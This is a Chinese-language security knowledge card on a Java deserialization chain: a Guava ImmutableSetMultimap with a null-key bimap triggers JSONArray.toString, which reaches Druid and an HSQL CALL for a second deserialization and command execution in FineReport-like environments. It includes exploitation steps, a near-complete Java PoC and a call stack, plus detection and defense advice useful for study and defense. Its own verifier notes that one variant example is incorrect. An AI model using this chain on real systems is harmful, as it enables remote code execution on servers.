---
id: web-java-deserialization-immutablesetmultimap-nullkey-checkentrynotnull-tostring
title: ImmutableSetMultimap 空 key 检查触发 JSONArray toString：checkEntryNotNull 桥接 DruidXADataSource + HSQL 二次反序列化
type: scenario
domain: web
path: web/java/deserialization
technique: guava-immutablebimap-checkentrynotnull-tostring-jdbc
aliases:
- ImmutableSetMultimap 空 key 反序列化链
- SingletonImmutableBiMap readResolve
- checkEntryNotNull toString
- ImmutableBiMap SerializedForm 利用
- JSONArray toString DruidXADataSource
- 帆软 ImmutableSetMultimap 链变体
tags:
- java
- deserialization
- guava
- immutablesetmultimap
- immutablebimap
- checkentrynotnull
- jsonarray
- druid
- hsqldb
- templatesimpl
- finereport
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V53
  verified_at: '2026-11-05T09:08:02+08:00'
  notes: 已对照原文及6张图核对：图01确认JSONArray.toString触发getter；图02确认ImmutableBiMap$SerializedForm.readResolve/createMap及keys=null、values=JSONArray；图03-04确认checkEntryNotNull(key=null,value=JSONArray)异常消息拼接；图05确认StringBuilder.append→String.valueOf→JSONArray.toString；图06确认ds.getXAConnection()后弹出计算器。PoC中Unsafe构造SingletonImmutableBiMap(singleKey=null,singleValue=JSONArray)、替换ImmutableMultimap.map、DruidXADataSource(validationQuery=HSQL CALL SerializationUtils.deserialize)与原文一致。未验证点：第二段payload为原文十六进制gadget，未在本机复跑；原文未给出产品版本，未设affected_versions；frontmatter无source_url。小问题：变体举例checkNonnegative入参为int，不能字符串化对象，建议后续删改该例。
---

## 一句话结论

把 `SingletonImmutableBiMap` 的 `singleKey` 置为 null、`singleValue` 置为恶意 `JSONArray`，再塞进 `ImmutableSetMultimap` 的 `map` 字段；反序列化时 `ImmutableBiMap$SerializedForm.readResolve → createMap → Builder.put → entryOf → checkEntryNotNull` 会把 null key 拼进异常消息，经 `String.valueOf` 调用 `JSONArray.toString`，由 Jackson 序列化触发 `DruidXADataSource.getXAConnection`，再借 HSQL 的 `CALL` 执行静态 `deserialize` 完成二次反序列化，最终执行任意命令。

## 原理

- **外层反序列化**：反序列化 `ImmutableSetMultimap` 时，`readObject` 读取内部的 map 结构；攻击者已用反射把 `ImmutableMultimap.map` 替换为由 `ImmutableMultiset.of(SingletonImmutableBiMap)` 组成的 `ImmutableMap`。
- **Bimap 的 readResolve**：`SingletonImmutableBiMap` 的序列化形式 `ImmutableBiMap$SerializedForm` 在反序列化时调用 `readResolve()`，再调用父类 `ImmutableMap$SerializedForm.createMap(builder)`，把序列化保存的 key/value 通过 `Builder.put` 重新放回 map。
- **空 key 检查**：`Builder.put` → `ImmutableMap.entryOf` → `CollectPreconditions.checkEntryNotNull(key, value)`。当 `key == null` 时，代码构造异常消息：
  ```java
  throw new NullPointerException("null key in entry: null=" + value);
  ```
  Java 的字符串拼接走 `StringBuilder.append(Object)`，内部调用 `String.valueOf(value)`，进而调用 `value.toString()`——这是整条链的桥接点。
- **JSONArray.toString → Jackson getter**：`value` 是 `com.fr.json.JSONArray`，其 `toString()` → `encode()` → `EmbedJson.encode()` → Jackson `ObjectMapper.writeValueAsString()`。Jackson 序列化 POJO 时会调用 getter。
- **Druid 数据源 getter**：JSONArray 中的元素是 `DruidXADataSource`；Jackson 调用其 `getXAConnection()` → `getConnection()` → `DruidDataSource.init()`，在初始化连接时执行 `validationQuery`。
- **HSQL 二次反序列化**：把 `jdbcUrl` 设为 `jdbc:hsqldb:mem:test`、驱动设为 `com.fr.third.org.hsqldb.jdbcDriver`，`validationQuery` 设为
  `CALL "com.fr.third.springframework.util.SerializationUtils.deserialize"(X'<第二段payload>')`
  HSQL 允许在 SQL 中调用 public static 方法，于是对十六进制字节做第二次 Java 反序列化；第二段 payload（原文为 Hibernate/Spring 相关 gadget 到 TemplatesImpl）最终执行 `Runtime.exec`（原文弹出计算器）。
- **为什么用 null key**：`checkEntryNotNull` 的异常消息本身会字符串化 value，是“异常路径触发 toString”的典型 gadget；相比 `UsingToStringOrdering` 变体，它不依赖排序比较器，只需一个 null key。
- **原文验证**：调试栈完整显示 `ImmutableSetMultimap.readObject → ImmutableBiMap$SerializedForm.readResolve → createMap → Builder.put → entryOf → checkEntryNotNull → StringBuilder.append → String.valueOf → JSONArray.toString → EmbedJson.encode → Jackson → DruidXADataSource.getXAConnection`，并成功弹出计算器。

## 触发条件

- 存在 Java 反序列化入口，能提交任意序列化数据。
- 目标 classpath 同时包含：Guava（`ImmutableSetMultimap`/`SingletonImmutableBiMap`）、帆软系 JSON（`com.fr.json.JSONArray`/`EmbedJson`）、Druid（`DruidXADataSource`）、HSQLDB 驱动，以及第二段反序列化可用的 gadget（原文用 Spring `SerializationUtils.deserialize` + Hibernate/TemplatesImpl 组成的 payload）。
- 目标未通过 JEP 290/黑名单拦截上述类；原文环境为 JDK 8。
- `validationQuery` 可在连接初始化时执行（Druid `initialSize≥1`、HSQL 内存库可用）。

## 利用步骤

1. 生成第二段 payload（TemplatesImpl/Hibernate 链）的序列化字节，转十六进制字符串。
2. 构造 `DruidXADataSource`：`jdbcUrl=jdbc:hsqldb:mem:test`、driver `com.fr.third.org.hsqldb.jdbcDriver`、`validationQuery` 为调用 `com.fr.third.springframework.util.SerializationUtils.deserialize` 的 `CALL`；将 `transactionHistogram`、`initedLatch`、`statLogger`、`logWriter` 等无法序列化的字段置 null。
3. 创建 `JSONArray` 并把 Druid 数据源放入；把整个 JSONArray 作为 `SingletonImmutableBiMap` 的 `singleValue`。
4. 用 `Unsafe.allocateInstance` 创建 `SingletonImmutableBiMap`，反射把 `singleKey` 设为 null、`singleValue` 设为该 JSONArray。
5. 构建 `ImmutableSetMultimap`，再用反射把 `ImmutableMultimap.map` 字段替换为 `ImmutableMap.of("1", ImmutableMultiset.of(该 bimap))`。
6. 序列化 multimap 并发送到反序列化入口；`checkEntryNotNull` 的异常消息触发 `toString`，后续 Jackson/Druid/HSQL 链执行第二段 payload。

## PoC

```java
// 1. 第二段 payload（DruidXADataSource 内嵌 HSQL CALL 反序列化）
DruidXADataSource ds = new DruidXADataSource();
setFieldValue(ds, "statLogger", null);
setFieldValue(ds, "logWriter", null);
setFieldValue(ds, "transactionHistogram", null);
setFieldValue(ds, "initedLatch", null);
setFieldValue(ds, "initialSize", 1);
setFieldValue(ds, "jdbcUrl", "jdbc:hsqldb:mem:test");
setFieldValue(ds, "validationQuery",
    "CALL \"com.fr.third.springframework.util.SerializationUtils.deserialize\"(X'<hex>')");
ds.setDriverClassName("com.fr.third.org.hsqldb.jdbcDriver");

// 2. 把 Druid 数据源放进 JSONArray
JSONArray jsonArray = new JSONArray();
jsonArray.put(ds);

// 3. 伪造 SingletonImmutableBiMap：null key + JSONArray value
Class<?> clazz = Class.forName("com.fr.third.guava.collect.SingletonImmutableBiMap");
Object bimap = createInstanceUnsafely(clazz);
setFieldValue(bimap, "singleKey", null);
setFieldValue(bimap, "singleValue", jsonArray);

// 4. 替换 ImmutableSetMultimap 的内部 map
ImmutableSetMultimap<Object, Object> multimap = ImmutableSetMultimap.of("key", ds);
ImmutableMap<Object, Object> newEntries =
    ImmutableMap.of("1", ImmutableMultiset.of(bimap));
Field mapField = ImmutableMultimap.class.getDeclaredField("map");
mapField.setAccessible(true);
mapField.set(multimap, newEntries);

// 5. 序列化后交给目标反序列化入口
unserialize(serialize(multimap));
```

原文调用栈关键段：

```text
ImmutableSetMultimap.readObject
→ ImmutableBiMap$SerializedForm.readResolve
→ ImmutableMap$SerializedForm.createMap
→ ImmutableMap$Builder.put → ImmutableMap.entryOf
→ CollectPreconditions.checkEntryNotNull("null key in entry: null=" + value)
→ StringBuilder.append → String.valueOf → JSONArray.toString
→ EmbedJson.encode → Jackson ObjectMapper.writeValueAsString
→ DruidXADataSource.getXAConnection → DruidDataSource.init → HSQL CALL
```

## 变体与关联

- 同类触发点：`checkEntryNotNull` 的“异常消息字符串化 value”可换成 `checkNonnegative` 等其他把对象拼进异常消息的工具方法；也可用 `checkArgument`/`Preconditions` 的格式化异常。
- 同一外层类的另一条链：`[[web-java-deserialization-immutablesetmultimap-usingtostring-jsonarray-hsql]]` 使用 `UsingToStringOrdering` + `ImmutableSortedSet.build → Arrays.sort → compare` 触发 `toString`，需要 valueComparator 与至少两个元素；本卡用 null key 的 `checkEntryNotNull`，构造更简单、触发点不同，但下游 `JSONArray → Druid → HSQL → TemplatesImpl` 相同。
- 下游变体：JSONArray 的 getter 触发可换成其他能发起 JDBC/JNDI/文件操作的 getter；HSQL `CALL` 可换成其他支持静态方法调用的数据库/驱动；第二段 sink 可换 TemplatesImpl、Spring AOP 代理等。
- 环境特征：类名均为 `com.fr.third.*`，属于帆软系产品的 shaded 依赖；该链在同类 FineReport 部署中可复用。

## 检测与防御

- 检测：反序列化流量中出现 `ImmutableSetMultimap`/`SingletonImmutableBiMap`/`com.fr.json.JSONArray`/`DruidXADataSource`/`hsqldb` 等类名；异常日志出现 `null key in entry: null=` 后紧跟 JSON/Jackson 相关栈；应用出现 HSQL 内存库连接与 `CALL` 语句；Java 进程异常执行 `calc`/`cmd`/`sh`。
- 修复：升级帆软系产品到修复版本（以厂商公告为准）；在反序列化入口启用 JEP 290 过滤器/白名单，拒绝上述 Guava/帆软 JSON/Druid/HSQL 类；生产环境移除或禁用 HSQLDB 驱动。
- 缓解：最小化 classpath（移除不需要的模板/报表依赖）；RASP 监控 `ObjectInputStream.readObject` 与 `Runtime.exec`；对反序列化接口做鉴权与来源限制；监控 Druid 数据源的异常初始化。
